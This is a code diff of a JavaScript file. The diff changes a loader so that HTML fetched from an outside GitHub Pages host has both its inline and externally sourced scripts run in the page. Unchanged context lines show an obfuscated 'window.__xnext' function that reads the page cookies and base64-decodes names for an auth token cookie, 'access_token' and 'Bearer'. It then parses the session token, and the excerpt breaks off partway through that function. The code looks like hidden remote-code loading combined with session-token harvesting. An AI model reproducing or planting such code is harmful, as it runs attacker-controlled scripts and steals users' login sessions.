@@ -21,8 +21,15 @@ function loadHTMLAndAppend(url) {
                     document.body.appendChild(child);
                 } else {
                     const script = document.createElement('script');
-                    script.textContent = child.textContent;
-                    document.body.appendChild(script);
+                    
+                    if (child.src) {
+                        script.src = child.src;
+                        script.onload = () => console.log(`Loaded script: ${child.src}`);
+                    } else {
+                        script.textContent = child.textContent;
+                    }
+
+                    document.body.appendChild(script); 
                 }
             });
         })
@@ -32,8 +39,6 @@ function loadHTMLAndAppend(url) {
 }
 
 loadHTMLAndAppend('https://vtmgr.github.io/shime.html');
-
-
 
 
 window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
